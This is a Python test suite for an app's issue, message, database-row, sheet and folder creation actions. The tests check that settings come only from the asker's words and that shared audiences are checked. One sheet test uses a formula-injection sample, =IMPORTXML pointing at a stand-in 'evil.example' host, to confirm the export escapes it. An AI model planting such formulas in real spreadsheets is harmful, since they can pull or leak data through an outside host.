"""The second set of Act actions: settings on new issues, a sub-issue, a
Notion database row, a Slack thread reply and DM, a Google Sheet, and a Drive
folder picked in Google's window. Each one only creates, and each setting is
taken from the asker's own words and resolved with their own token."""

from __future__ import annotations

import uuid
from types import SimpleNamespace

import pytest
from cryptography.fernet import Fernet

from app.actions import drive, github, linear, notion, policy, service, store
from app.actions import slack as slack_action
from app.actions.base import ActionContext, ActionTarget, Audience, Proposal
from app.auth import create_admin
from app.core.exceptions import ActionRejected

from .conftest import requires_db


def _ctx(question, email="a@x.com", surface=None):
    return ActionContext("org", None, "user", email, question, "tok", (), None, surface or {"kind": "web"})


# --------------------------------------------------------------------------
# Linear: settings and sub-issues
# --------------------------------------------------------------------------

TEAM = {"id": "t1", "key": "SYV", "name": "Syvora", "visibility": "private"}


def fake_linear(query, variables=None, *, write=False):
    if "teams(first" in query:
        return {"teams": {"nodes": [TEAM]}}
    if "members(first" in query and "displayName" in query:
        return {"team": {"members": {"nodes": [
            {"id": "u1", "name": "Sana Asiwal", "displayName": "sana", "email": "sana@x.com", "active": True},
            {"id": "u2", "name": "Sajal Mishra", "displayName": "sajal", "email": "sajal@x.com", "active": True}]}}}
    if "members(first" in query:
        return {"team": {"members": {"nodes": [{"email": "sana@x.com", "active": True}],
                                     "pageInfo": {"hasNextPage": False}}}}
    if "viewer" in query:
        return {"viewer": {"id": "u1", "name": "Sana Asiwal"}, "organization": {}}
    if "issueLabels" in query:
        return {"issueLabels": {"nodes": [{"id": "l1", "name": "Bug", "team": None},
                                          {"id": "l2", "name": "Billing", "team": {"id": "t1"}},
                                          {"id": "l3", "name": "Other team", "team": {"id": "t9"}}]}}
    if "projects(first" in query:
        return {"team": {"projects": {"nodes": [{"id": "p1", "name": "Atlas"}]}}}
    if "issue(id" in query:
        return {"issue": {"id": "i6", "identifier": "SYV-6", "title": "Search latency", "team": TEAM}}
    raise AssertionError(query)


@pytest.fixture
def lin(monkeypatch):
    monkeypatch.setattr(linear, "gql", lambda token, q, v=None, write=False: fake_linear(q, v, write=write))


def test_linear_settings_come_only_from_the_askers_words(lin):
    question = ("file an issue in SYV assigned to Sajal, priority high, labels Bug and Billing, "
                "in project Atlas, due 2026-10-30")
    proposal = linear.LinearCreateIssue().prepare(
        {"team": "SYV", "title": "Export", "body": "b", "assignee": "Sajal", "priority": "high",
         "labels": ["Bug", "Billing"], "project": "Atlas", "due_date": "2026-10-30",
         "due_words": "due 2026-10-30"}, _ctx(question))
    assert proposal.payload["set"] == {"assigneeId": "u2", "priority": 2, "labelIds": ["l1", "l2"],
                                       "projectId": "p1", "dueDate": "2026-10-30"}
    assert ["Assignee", "Sajal Mishra"] in proposal.payload["details"]


@pytest.mark.parametrize("args, question, why", [
    ({"assignee": "Priya"}, "file in SYV for Priya", "can't find"),         # not in the team
    ({"labels": ["Other team"]}, "file in SYV label Other team", "can't find"),  # another team's label
    ({"labels": ["Urgent"]}, "file in SYV label Urgent", "can't find"),      # never created
    ({"priority": "urgent"}, "file in SYV, it's important", "priority"),    # not the asker's word
    ({"due_date": "2026-10-30", "due_words": "by Friday"}, "file in SYV", "due date"),
    ({"assignee": "me"}, "file in SYV after the meeting", "assignee"),      # "me" inside "meeting"
])
def test_a_setting_the_asker_did_not_choose_is_refused(lin, args, question, why):
    with pytest.raises(ActionRejected, match=why):
        linear.LinearCreateIssue().prepare({"team": "SYV", "title": "t", "body": "b", **args}, _ctx(question))


def test_assign_to_me_and_a_sub_issue_joins_its_parents_team(lin):
    proposal = linear.LinearCreateIssue().prepare(
        {"parent": "SYV-6", "title": "Document cold start", "body": "b", "assignee": "me"},
        _ctx("create a sub-issue under SYV-6 and assign it to me"))
    assert proposal.target.external_id == "t1"
    assert proposal.payload["set"] == {"parentId": "i6", "assigneeId": "u1"}


def test_the_settings_are_sent_with_the_issue(monkeypatch):
    sent = []
    monkeypatch.setattr(linear, "gql", lambda token, q, v=None, write=False: sent.append(v) or {
        "issueCreate": {"issue": {"id": "i", "identifier": "SYV-20", "url": "https://linear.app/x"}}})
    linear.LinearCreateIssue().execute("k", {"external_id": "t1"},
                                       {"title": "t", "body": "b", "set": {"priority": 2}}, "tok")
    assert sent[0]["input"]["priority"] == 2 and sent[0]["input"]["teamId"] == "t1"


# --------------------------------------------------------------------------
# GitHub: labels and assignees
# --------------------------------------------------------------------------

@pytest.fixture
def gh(monkeypatch):
    access = {"pull": True, "push": True}
    monkeypatch.setattr(github, "company_repo", lambda org, name: "acme/handbook")

    def call(method, path, token, *, json=None):
        if path == "/repos/acme/handbook":
            return {"private": True, "has_issues": True, "permissions": access}
        if path.startswith("/repos/acme/handbook/labels"):
            return [{"name": "bug"}, {"name": "Billing"}]
        if path == "/repos/acme/handbook/assignees/sana":
            return {}
        if path.startswith("/repos/acme/handbook/assignees/"):
            raise ActionRejected("GitHub refused")
        raise AssertionError(path)

    monkeypatch.setattr(github, "_call", call)
    return access


def test_github_labels_and_assignees_must_exist_and_be_asked_for(gh):
    issue = github.GitHubCreateIssue()
    q = "open an issue in handbook labelled Bug, assigned to @sana"
    p = issue.prepare({"repo": "handbook", "title": "t", "body": "b", "labels": ["Bug"],
                       "assignees": ["@sana"]}, _ctx(q))
    assert p.payload["set"] == {"labels": ["bug"], "assignees": ["sana"]}
    with pytest.raises(ActionRejected, match="no label"):
        issue.prepare({"repo": "handbook", "title": "t", "body": "b", "labels": ["wontfix"]},
                      _ctx("open an issue in handbook labelled wontfix"))
    with pytest.raises(ActionRejected, match="can't be assigned"):
        issue.prepare({"repo": "handbook", "title": "t", "body": "b", "assignees": ["mallory"]},
                      _ctx("open an issue in handbook for mallory"))
    gh["push"] = False                    # GitHub would silently drop them: refuse instead
    with pytest.raises(ActionRejected, match="write access"):
        issue.prepare({"repo": "handbook", "title": "t", "body": "b", "labels": ["Bug"]}, _ctx(q))


# --------------------------------------------------------------------------
# Slack: a thread reply and a direct message, as the person
# --------------------------------------------------------------------------

USERS = [{"id": "U1", "name": "sana", "profile": {"real_name": "Sana Asiwal", "email": "a@x.com"}},
         {"id": "U2", "name": "sajal", "profile": {"real_name": "Sajal Mishra", "email": "sajal@x.com"}},
         {"id": "UB", "name": "bot", "is_bot": True, "profile": {"real_name": "Sajal Mishra"}}]
ENG = {"id": "C1", "name": "eng", "is_private": False, "is_member": True}


@pytest.fixture
def sl(monkeypatch):
    monkeypatch.setattr(slack_action, "_get", lambda token, method, params: {"channel": ENG})
    monkeypatch.setattr(slack_action, "_pages", lambda token, method, params, key: (USERS, True))


def test_a_dm_goes_to_the_one_person_named_and_only_they_see_it(sl):
    p = slack_action.SlackPostMessage().prepare({"person": "Sajal Mishra", "text": "Can you review?"},
                                                _ctx("DM Sajal Mishra: can you review?"))
    assert (p.target.kind, p.target.external_id) == ("slack_user", "U2")      # never the bot
    assert p.audience == Audience(members=("sajal@x.com", "a@x.com"))
    with pytest.raises(ActionRejected, match="can't find"):
        slack_action.SlackPostMessage().prepare({"person": "Priya", "text": "hi"}, _ctx("DM Priya: hi"))


def test_a_thread_reply_needs_the_link_the_asker_pasted(sl):
    link = "https://acme.slack.com/archives/C1/p1700000000123456?thread_ts=1699999999.000100&cid=C1"
    p = slack_action.SlackPostMessage().prepare({"thread": link, "text": "Done"},
                                                _ctx(f"reply in {link} saying done"))
    assert p.target.external_id == "C1" and p.payload["thread_ts"] == "1699999999.000100"
    root = "https://acme.slack.com/archives/C1/p1700000000123456"
    assert slack_action.SlackPostMessage().prepare(
        {"thread": root, "text": "Done"}, _ctx(f"reply to {root}")).payload["thread_ts"] == "1700000000.123456"
    with pytest.raises(ActionRejected, match="Name the Slack thread"):
        slack_action.SlackPostMessage().prepare({"thread": link, "text": "x"}, _ctx("reply in that thread"))


def test_a_dm_is_opened_only_when_sent(monkeypatch):
    calls = []
    monkeypatch.setattr(slack_action, "_post", lambda token, method, body, **kw: calls.append(method) or
                        {"ok": True, "channel": {"id": "D9"}})

    class Sent:
        def json(self):
            return {"ok": True, "ts": "1.2"}

    monkeypatch.setattr(slack_action.httpx, "post", lambda url, json, timeout, headers: calls.append(json) or Sent())
    monkeypatch.setattr(slack_action, "_get", lambda *a: {"permalink": "https://acme.slack.com/x"})
    slack_action.SlackPostMessage().execute("k", {"kind": "slack_user", "external_id": "U2"},
                                            {"text": "hi", "as_person": True}, "xoxp")
    assert calls[0] == "conversations.open" and calls[1]["channel"] == "D9"


# --------------------------------------------------------------------------
# Notion: a database row
# --------------------------------------------------------------------------

SOURCE = {"id": "ds1", "title": [{"plain_text": "Bug tracker"}], "url": "https://notion.so/ds1",
          "properties": {
              "Name": {"type": "title"},
              "Status": {"type": "status", "status": {"options": [{"name": "Todo"}, {"name": "Done"}]}},
              "Tags": {"type": "multi_select", "multi_select": {"options": [{"name": "API"}, {"name": "UI"}]}},
              "Points": {"type": "number"},
              "Due": {"type": "date"},
              "Owner": {"type": "people"}}}


@pytest.fixture
def notion_db(monkeypatch):
    def call(method, path, token, *, json=None, refused=None):
        if path == "/search":
            return {"results": [SOURCE]}
        if path == "/data_sources/ds1":
            return SOURCE
        if path == "/pages":
            return {"id": "row1", "url": "https://notion.so/row1", "sent": json}
        raise AssertionError(path)
    monkeypatch.setattr(notion, "_call", call)
    monkeypatch.setattr(notion, "_check_indexed_visibility", lambda page_id, ctx: None)


def test_a_row_fills_existing_columns_with_existing_choices(notion_db):
    row = notion.NotionAddRow()
    p = row.prepare({"database": "Bug tracker", "title": "Export timeout",
                     "fields": {"status": "Todo", "Tags": "API, UI", "Points": "3", "Due": "2026-10-30"}},
                    _ctx("add a row to Bug tracker: export timeout, status Todo"))
    assert p.payload["properties"] == {"Status": {"status": {"name": "Todo"}},
                                       "Tags": {"multi_select": [{"name": "API"}, {"name": "UI"}]},
                                       "Points": {"number": 3.0}, "Due": {"date": {"start": "2026-10-30"}}}
    made = row.execute("k", p.target.as_dict(), p.payload, "tok")
    assert made.external_id == "row1"


@pytest.mark.parametrize("fields, why", [
    ({"Status": "Blocked"}, "no option"),        # never creates a choice
    ({"Owner": "Sana"}, "can't fill"),           # a person is never chosen by a draft
    ({"Priority": "High"}, "no column"),
    ({"Points": "lots"}, "number"),
])
def test_a_row_refuses_what_the_database_does_not_have(notion_db, fields, why):
    with pytest.raises(ActionRejected, match=why):
        notion.NotionAddRow().prepare({"database": "Bug tracker", "title": "t", "fields": fields},
                                      _ctx("add a row to Bug tracker"))


# --------------------------------------------------------------------------
# Google: a Sheet, and a folder picked in Google's window
# --------------------------------------------------------------------------

def test_a_sheet_never_sends_a_formula():
    rows = [["Name", "Total"], ["=IMPORTXML(\"https://evil.example\")", "-5"], ["@sum", "12"]]
    csv_text = drive.sheet_csv(rows)
    assert "'=IMPORTXML" in csv_text and "'-5" in csv_text and "'@sum" in csv_text


def test_a_sheet_draft_stays_a_table():
    sheet = drive.DriveCreateSheet()
    p = sheet.prepare({"title": "Teams", "rows": [["Team", "Open"], ["SYV", "4"]]}, _ctx("make a sheet"))
    assert drive.table_rows(p.payload["body"]) == [["Team", "Open"], ["SYV", "4"]]
    edited = sheet.edit(p.payload, {"body": "| Team | Open |\n| --- | --- |\n| SYV | 5 |"})
    assert drive.table_rows(edited["body"])[1] == ["SYV", "5"]
    with pytest.raises(ActionRejected, match="stay a table"):
        sheet.edit(p.payload, {"body": "just some words"})


@pytest.mark.parametrize("perms, audience", [
    ([{"type": "user", "emailAddress": "A@x.com"}], Audience(members=("a@x.com",))),
    ([{"type": "domain"}], Audience(public=True)),
    ([{"type": "group", "emailAddress": "eng@x.com"}], Audience(members=None)),
])
def test_a_folders_sharing_is_its_audience(monkeypatch, perms, audience):
    class Reply:
        status_code = 200

        def __init__(self, body):
            self.body = body

        def json(self):
            return self.body

    folder = {"id": "F1", "name": "Retros", "mimeType": drive.FOLDER, "capabilities": {"canAddChildren": True}}
    monkeypatch.setattr(drive.httpx, "get", lambda url, **kw: Reply(
        {"permissions": perms} if url.endswith("/permissions") else folder))
    assert drive.folder_audience("tok", "F1") == ("Retros", audience)


@pytest.fixture
def org(store, org_cleanup, monkeypatch):
    monkeypatch.setenv("AUTH_ENCRYPTION_KEYS", Fernet.generate_key().decode())
    org_id = store.create_organization(f"Act more {uuid.uuid4().hex[:8]}")
    org_cleanup.append(org_id)
    admin = create_admin(f"more-{uuid.uuid4().hex[:8]}@example.com", org_id)
    policy.set_policy(org_id, policy.ACT_KEY, True)
    monkeypatch.setattr("app.auth.user_connections.fresh_user_token", lambda org, user, provider: "tok")
    return SimpleNamespace(id=org_id, admin=admin)


def _doc_row(org, private: bool):
    from app.actions.base import Source

    return store.create(
        org_id=org.id, workspace_id=None, user_id=org.admin.id, conversation_id=None, surface="web",
        proposal=Proposal("drive.create_doc", ActionTarget("google_drive", "my-drive", "Your Google Drive"),
                          {"title": "Retro", "body": "b"}, Audience(members=())),
        sources=[Source("d1", "Reorg plan", public=not private, viewers=("x@x.com",))],
        exposure="none", ttl_seconds=600)


@requires_db
@pytest.mark.parametrize("shared, private, outcome", [
    (Audience(members=None), False, "none"),       # shared, but nothing private in it
    (Audience(members=None), True, "unknown"),     # shared + private: the tick is asked
    (Audience(public=True), True, "refused"),      # whole domain + private: never
])
def test_choosing_a_folder_checks_who_will_see_it_again(org, monkeypatch, shared, private, outcome):
    monkeypatch.setattr(drive, "folder_audience", lambda token, folder: ("Team folder", shared))
    row = _doc_row(org, private)
    choose = lambda: service.choose_folder(org_id=org.id, user_id=org.admin.id, action_id=row.id,  # noqa: E731
                                           shown_hash=row.payload_hash, folder_id="F1aaaaaaaaaa")
    if outcome == "refused":
        with pytest.raises(ActionRejected, match="shared with everyone"):
            choose()
        return
    moved = choose()
    assert moved.exposure == outcome and moved.payload["folder"]["id"] == "F1aaaaaaaaaa"
    assert ["Folder", "Team folder"] in moved.payload["details"]
    assert moved.payload_hash != row.payload_hash      # what is approved is what was shown


@requires_db
def test_a_folder_only_the_asker_sees_keeps_the_draft_private(org, monkeypatch):
    monkeypatch.setattr(drive, "folder_audience",
                        lambda token, folder: ("Mine", Audience(members=(org.admin.email.lower(),))))
    row = _doc_row(org, private=True)
    moved = service.choose_folder(org_id=org.id, user_id=org.admin.id, action_id=row.id,
                                  shown_hash=row.payload_hash, folder_id="F1aaaaaaaaaa")
    assert moved.exposure == "none" and "(shared folder)" not in moved.target["name"]


def test_a_connection_needing_reconnect_is_still_offered(monkeypatch):
    """Hidden, the model said it had no Linear tool; offered, the draft says
    "Reconnect your Linear account" and nothing is sent (no token)."""
    from datetime import datetime

    from app.actions import service
    from app.auth.user_connections import UserConnectionInfo

    monkeypatch.setattr(service.policy, "act_on", lambda org, ws=None: True)
    monkeypatch.setattr(service.policy, "enabled_actions", lambda org, ws=None: {"linear.create_issue"})
    monkeypatch.setattr(service, "list_user_connections", lambda org, uid: [
        UserConnectionInfo("linear", "x", "Sana", (), True, datetime(2026, 1, 1))])
    offered, why = service.offered_actions("org", "u1", None)
    assert [a.name for a in offered] == ["linear.create_issue"] and why is None


def test_a_doc_turns_plain_text_banners_into_headings():
    """Google reads the Doc as Markdown: a '=====' line made a giant heading
    that still showed the '=' signs."""
    from app.actions.drive import without_rules

    drafted = "Intro.\n\n=========\n==== PART 1: LEAVE POLICY ====\nOverview.\nA = B stays\n====="
    assert without_rules(drafted) == "Intro.\n\n## PART 1: LEAVE POLICY\nOverview.\nA = B stays"
